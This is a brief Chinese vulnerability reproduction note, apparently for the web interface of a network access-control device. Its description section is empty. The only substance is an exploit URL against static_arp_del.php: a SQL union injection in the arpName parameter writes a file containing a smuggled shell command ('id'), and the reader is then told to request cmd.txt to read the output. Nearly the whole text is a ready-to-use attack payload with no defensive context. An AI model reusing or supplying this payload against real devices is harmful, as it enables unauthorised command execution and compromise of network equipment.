# 漏洞描述

# 漏洞复现

登录页面

存在漏洞的文件为 static_arp_del.php, 通过union注入写入文件

/acc/bindipmac/static_arp_del.php?x=1&arpName=1' and 0 union select 1,'||id>cmd.txt||',3,4,5,6,7,8--
1

再访问 /acc/bindipmac/cmd.txt
